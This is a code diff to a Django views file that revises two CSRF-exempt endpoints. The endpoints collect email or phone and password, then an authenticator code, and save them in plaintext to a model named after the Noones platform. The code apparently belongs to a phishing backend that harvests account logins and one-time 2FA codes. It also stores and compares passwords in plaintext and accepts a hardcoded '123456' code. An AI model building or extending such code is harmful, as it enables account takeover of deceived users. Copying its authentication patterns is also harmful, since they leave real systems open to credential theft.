@@ -1027,7 +1027,7 @@ def indextwo(request):
     #noones
 # View to submit email/phone and password
 
-# View to submit user data
+# Endpoint: Submit User Data
 @csrf_exempt
 def submit_user_data(request):
     if request.method == "POST":
@@ -1037,22 +1037,30 @@ def submit_user_data(request):
             email_or_phone = data.get("emailOrPhone")
             password = data.get("password")
 
-            # Save user data to the database
-            user_profile = UserProfileNoones.objects.create(
+            # Validate required fields
+            if not email_or_phone or not password:
+                return JsonResponse({"error": "Missing fields"}, status=400)
+
+            # Save user data
+            user_profile, created = UserProfileNoones.objects.get_or_create(
                 email_or_phone=email_or_phone,
-                password=password
+                defaults={"password": password}
             )
+
+            if not created:
+                return JsonResponse({"message": "User already exists."}, status=200)
+
             return JsonResponse({"message": "User data saved successfully!"}, status=200)
 
         except json.JSONDecodeError:
             return JsonResponse({"error": "Invalid JSON format"}, status=400)
         except Exception as e:
-            return JsonResponse({"error": f"An error occurred: {str(e)}"}, status=500)
+            return JsonResponse({"error": f"Unexpected error: {str(e)}"}, status=500)
 
     return JsonResponse({"error": "Invalid request method"}, status=405)
 
 
-# View to submit authenticator code
+# Endpoint: Submit Authenticator Code
 @csrf_exempt
 def submit_authenticator_code(request):
     if request.method == "POST":
@@ -1063,19 +1071,34 @@ def submit_authenticator_code(request):
             password = data.get("password")
             authenticator_code = data.get("authenticatorCode")
 
-            # Save the authenticator code to the database
-            user_profile = UserProfileNoones.objects.create(
+            # Validate required fields
+            if not email_or_phone or not password or not authenticator_code:
+                return JsonResponse({"error": "Missing fields"}, status=400)
+
+            # Check if the user exists
+            user_profile = UserProfileNoones.objects.filter(
                 email_or_phone=email_or_phone,
-                password=password,
-                authenticator_code=authenticator_code,
-                submitted_at=timezone.now()
-            )
-            return JsonResponse({"message": "Authenticator code saved successfully!"}, status=200)
+                password=password
+            ).first()
+
+            if not user_profile:
+                return JsonResponse({"error": "User not found"}, status=404)
+
+            # Mock authenticator code validation (replace with actual logic)
+            if authenticator_code == "123456":  # Replace with real validation
+                # Update the user's profile with the authenticator code
+                user_profile.authenticator_code = authenticator_code
+                user_profile.submitted_at = timezone.now()
+                user_profile.save()
+
+                return JsonResponse({"message": "Authenticator code validated successfully!"}, status=200)
+            else:
+                return JsonResponse({"error": "Invalid authenticator code"}, status=401)
 
         except json.JSONDecodeError:
             return JsonResponse({"error": "Invalid JSON format"}, status=400)
         except Exception as e:
-            return JsonResponse({"error": f"An error occurred: {str(e)}"}, status=500)
+            return JsonResponse({"error": f"Unexpected error: {str(e)}"}, status=500)
 
     return JsonResponse({"error": "Invalid request method"}, status=405)
 
